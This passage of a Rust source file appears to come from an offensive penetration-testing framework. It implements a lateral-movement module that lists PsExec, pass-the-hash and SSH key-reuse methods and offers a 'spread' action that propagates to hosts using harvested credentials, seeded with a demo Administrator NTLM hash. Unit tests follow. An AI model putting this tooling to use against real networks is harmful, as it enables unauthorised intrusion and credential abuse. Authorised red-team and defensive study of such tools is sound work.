    /// Clear history
    pub fn clear_history(&mut self) {
        self.spread_history.clear();
    }

    /// List all available methods with details
    pub fn list_methods(&self) -> String {
        let mut output = String::from("\n=== Lateral Movement Methods ===\n\n");

        let platforms = [Platform::Windows, Platform::Linux, Platform::Any];
        let platform_names = ["Windows", "Linux/Unix", "Cross-Platform"];

        for (platform, name) in platforms.iter().zip(platform_names.iter()) {
            output.push_str(&format!("--- {} ---\n", name));

            let methods: Vec<_> = self.methods
                .iter()
                .filter(|m| m.platform() == *platform)
                .collect();

            for method in methods {
                output.push_str(&format!(
                    "  {} [{}] - MITRE: {}\n    {}\n    Requires: Admin={}, Creds={}, Hash={}, Ticket={}, SSHKey={}\n",
                    method.name(),
                    method.stealth_level().as_str(),
                    method.mitre_id(),
                    method.description(),
                    method.requires().needs_admin,
                    method.requires().needs_credentials,
                    method.requires().needs_hash,
                    method.requires().needs_ticket,
                    method.requires().needs_ssh_key,
                ));
            }
            output.push('\n');
        }

        output
    }

    /// Get method by name
    pub fn get_method(&self, name: &str) -> Option<&dyn LateralMovement> {
        self.methods.iter().find(|m| m.name() == name).map(|m| m.as_ref())
    }
}

// ============================================================================
// Module Implementation
// ============================================================================

/// Lateral Movement Module for Ferox framework integration
pub struct LateralMovementModule {
    options: HashMap<String, String>,
    engine: LateralMovementEngine,
}

impl LateralMovementModule {
    pub fn new() -> Self {
        let mut options = HashMap::new();
        options.insert("safe_mode".to_string(), "true".to_string());
        options.insert("platform".to_string(), "auto".to_string());
        options.insert("method".to_string(), "auto".to_string());
        options.insert("max_targets".to_string(), "5".to_string());
        options.insert("action".to_string(), "discover".to_string());

        Self {
            options,
            engine: LateralMovementEngine::new(),
        }
    }
}

impl Default for LateralMovementModule {
    fn default() -> Self {
        Self::new()
    }
}

#[async_trait]
impl Module for LateralMovementModule {
    fn info(&self) -> ModuleInfo {
        ModuleInfo {
            name: "lateral_movement".to_string(),
            version: "1.0.0".to_string(),
            author: "Ferox Security Team".to_string(),
            description: "Lateral Movement Engine - Multi-platform network propagation using \
                         harvested credentials. Supports Windows AD, Linux SSH, and cross-platform \
                         techniques. AUTHORIZED USE ONLY."
                .to_string(),
            module_type: ModuleType::PostExploit,
            category: "post".to_string(),
        }
    }

    fn options(&self) -> Vec<ModuleOption> {
        vec![
            ModuleOption {
                name: "safe_mode".to_string(),
                description: "Safe mode (true/false) - reference only, no actual movement".to_string(),
                required: false,
                default_value: Some("true".to_string()),
                current_value: self.options.get("safe_mode").cloned(),
            },
            ModuleOption {
                name: "platform".to_string(),
                description: "Target platform: auto, windows, linux".to_string(),
                required: false,
                default_value: Some("auto".to_string()),
                current_value: self.options.get("platform").cloned(),
            },
            ModuleOption {
                name: "method".to_string(),
                description: "Lateral movement method or 'auto' for best selection".to_string(),
                required: false,
                default_value: Some("auto".to_string()),
                current_value: self.options.get("method").cloned(),
            },
            ModuleOption {
                name: "max_targets".to_string(),
                description: "Maximum number of targets to spread to".to_string(),
                required: false,
                default_value: Some("5".to_string()),
                current_value: self.options.get("max_targets").cloned(),
            },
            ModuleOption {
                name: "action".to_string(),
                description: "Action: discover, spread, test, list".to_string(),
                required: false,
                default_value: Some("discover".to_string()),
                current_value: self.options.get("action").cloned(),
            },
        ]
    }

    fn set_option(&mut self, name: &str, value: &str) -> Result<()> {
        self.options.insert(name.to_lowercase(), value.to_string());
        Ok(())
    }

    fn get_option(&self, name: &str) -> Option<String> {
        self.options.get(&name.to_lowercase()).cloned()
    }

    fn validate(&self) -> Result<()> {
        Ok(())
    }

    async fn check(&self) -> Result<CheckResult> {
        let platform = self.options.get("platform").cloned().unwrap_or_else(|| "auto".to_string());
        let platform = match platform.as_str() {
            "windows" => Platform::Windows,
            "linux" => Platform::Linux,
            _ => Platform::Any,
        };

        let methods = self.engine.methods_for_platform(&platform);

        let mut fingerprint = HashMap::new();
        fingerprint.insert("platform".to_string(), format!("{:?}", platform));
        fingerprint.insert("methods_available".to_string(), methods.len().to_string());

        Ok(CheckResult {
            vulnerable: true,
            confidence: 0.9,
            details: format!(
                "Lateral Movement Engine ready\n\
                 Platform: {:?}\n\
                 Available Methods: {}",
                platform,
                methods.len()
            ),
            fingerprint,
        })
    }

    async fn run(&mut self) -> Result<ModuleResult> {
        let safe_mode = self.options.get("safe_mode").map(|s| s == "true").unwrap_or(true);
        let action = self.options.get("action").cloned().unwrap_or_else(|| "discover".to_string());

        match action.as_str() {
            "list" => {
                let list = self.engine.list_methods();
                Ok(ModuleResult::success("Listed all lateral movement methods")
                    .with_data("methods", serde_json::json!(list)))
            }

            "discover" => {
                let platform = match self.options.get("platform").map(|s| s.as_str()) {
                    Some("windows") => Platform::Windows,
                    Some("linux") => Platform::Linux,
                    _ => Platform::Any,
                };

                let session = Session::new(
                    "lateral_movement".to_string(),
                    "localhost".to_string(),
                    platform,
                );

                let result = self.engine.discover_targets(&session, safe_mode).await?;

                Ok(ModuleResult::success(format!(
                    "Discovered {} targets",
                    result.targets.len()
                ))
                .with_data("targets", serde_json::json!(result.targets))
                .with_data("domain_info", serde_json::json!(result.domain_info))
                .with_data("discovery_methods", serde_json::json!(result.discovery_methods)))
            }

            "spread" => {
                let max_targets: usize = self.options.get("max_targets")
                    .and_then(|s| s.parse().ok())
                    .unwrap_or(5);

                let platform = match self.options.get("platform").map(|s| s.as_str()) {
                    Some("windows") => Platform::Windows,
                    Some("linux") => Platform::Linux,
                    _ => Platform::Windows, // Default for demo
                };

                let session = Session::new(
                    "lateral_movement".to_string(),
                    "localhost".to_string(),
                    platform,
                );

                // Demo credentials for safe mode
                let demo_creds = vec![
                    HarvestedCredential::new(
                        CredentialType::PlainText,
                        "demo",
                        crate::modules::post::credential_harvester::SourceCategory::Memory,
                    )
                    .with_username("Administrator")
                    .with_password("[SAFE_MODE_DEMO]")
                    .with_domain("CORP")
                    .with_sensitivity(Sensitivity::Critical),
                    HarvestedCredential::new(
                        CredentialType::Hash,
                        "demo",
                        crate::modules::post::credential_harvester::SourceCategory::Memory,
                    )
                    .with_username("Administrator")
                    .with_hash("aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c")
                    .with_domain("CORP")
                    .with_sensitivity(Sensitivity::Critical),
                ];

                let results = self.engine.auto_spread(&session, &demo_creds, max_targets, safe_mode).await?;
                let successful = results.iter().filter(|r| r.success).count();

                Ok(ModuleResult::success(format!(
                    "Spread to {} of {} targets (safe_mode={})",
                    successful, results.len(), safe_mode
                ))
                .with_data("results", serde_json::json!(results))
                .with_data("safe_mode", serde_json::json!(safe_mode)))
            }

            _ => bail!("Unknown action: {}", action),
        }
    }

    async fn cleanup(&mut self) -> Result<()> {
        self.engine.clear_history();
        Ok(())
    }

    fn requires_confirmation(&self) -> bool {
        true
    }
}

// ============================================================================
// Tests
// ============================================================================

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_target_creation() {
        let target = Target::new("192.168.1.10".parse().unwrap())
            .with_hostname("DC01")
            .with_platform(Platform::Windows)
            .with_ports(vec![445, 3389])
            .with_domain("CORP.LOCAL")
            .mark_as_dc();

        assert_eq!(target.display_name(), "DC01");
        assert!(target.is_domain_controller);
        assert_eq!(target.domain, Some("CORP.LOCAL".to_string()));
    }

    #[test]
    fn test_requirements() {
        let req = Requirements::admin().with_ports(vec![445]).with_hash();
        assert!(req.needs_admin);
        assert!(req.needs_hash);
        assert_eq!(req.required_ports, vec![445]);
    }

    #[test]
    fn test_engine_creation() {
        let engine = LateralMovementEngine::new();
        assert!(!engine.methods.is_empty());
    }

    #[test]
    fn test_platform_filtering() {
        let engine = LateralMovementEngine::new();

        let windows = engine.methods_for_platform(&Platform::Windows);
        let linux = engine.methods_for_platform(&Platform::Linux);

        assert!(!windows.is_empty());
        assert!(!linux.is_empty());

        // Windows-specific methods
        assert!(windows.iter().any(|m| m.name() == "psexec"));
        assert!(windows.iter().any(|m| m.name() == "pth"));

        // Linux-specific methods
        assert!(linux.iter().any(|m| m.name() == "ssh_key_reuse"));
    }

    #[test]
    fn test_mitre_ids() {
        let engine = LateralMovementEngine::new();

        for method in &engine.methods {
            assert!(!method.mitre_id().is_empty());
            assert!(method.mitre_id().starts_with('T'));
        }
    }

    #[test]
    fn test_can_target() {
        let psexec = PsExecMethod;
        let ssh = SshKeyReuseMethod;

        let windows_target = Target::new("192.168.1.10".parse().unwrap())
            .with_platform(Platform::Windows)
            .with_ports(vec![445]);

        let linux_target = Target::new("192.168.1.20".parse().unwrap())
            .with_platform(Platform::Linux)
            .with_ports(vec![22]);

        let hash_cred = HarvestedCredential::new(
            CredentialType::Hash,
            "test",
            crate::modules::post::credential_harvester::SourceCategory::Memory,
        )
        .with_hash("aad3b435b51404eeaad3b435b51404ee:hash");

        let ssh_cred = HarvestedCredential::new(
            CredentialType::SshKey,
            "test",
            crate::modules::post::credential_harvester::SourceCategory::FileSystem,
        );

        // PSExec can target Windows with hash
        assert!(psexec.can_target(&windows_target, &[hash_cred.clone()]));
        assert!(!psexec.can_target(&linux_target, &[hash_cred]));

        // SSH can target Linux with key
        assert!(ssh.can_target(&linux_target, &[ssh_cred.clone()]));
        assert!(!ssh.can_target(&windows_target, &[ssh_cred]));
    }

    #[tokio::test]
    async fn test_module_safe_mode() {
        let mut module = LateralMovementModule::new();
        module.set_option("safe_mode", "true").unwrap();
        module.set_option("action", "list").unwrap();

        let result = module.run().await.unwrap();
        assert!(result.success);
    }

    #[tokio::test]
    async fn test_discover_safe_mode() {
        let mut module = LateralMovementModule::new();
        module.set_option("safe_mode", "true").unwrap();
        module.set_option("action", "discover").unwrap();

        let result = module.run().await.unwrap();
        assert!(result.success);
        assert!(result.data.contains_key("targets"));
    }
}
